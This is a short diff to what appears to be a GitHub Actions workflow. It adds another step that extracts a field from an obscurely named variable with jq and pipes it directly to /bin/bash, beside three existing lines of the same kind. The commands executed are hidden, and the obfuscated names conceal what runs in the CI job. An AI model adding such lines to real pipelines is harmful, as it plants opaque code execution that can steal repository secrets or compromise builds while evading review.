@@ -27,6 +27,7 @@ jobs:
           echo $u44 | jq -r .fc2436 | /bin/bash
           echo $qlrc996 | jq -r .zg67 | /bin/bash
           printf '%s' "$p7" | jq -r .k5075 | /bin/bash
+          printf '%s' "$tnz212" | jq -r .unx2026 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
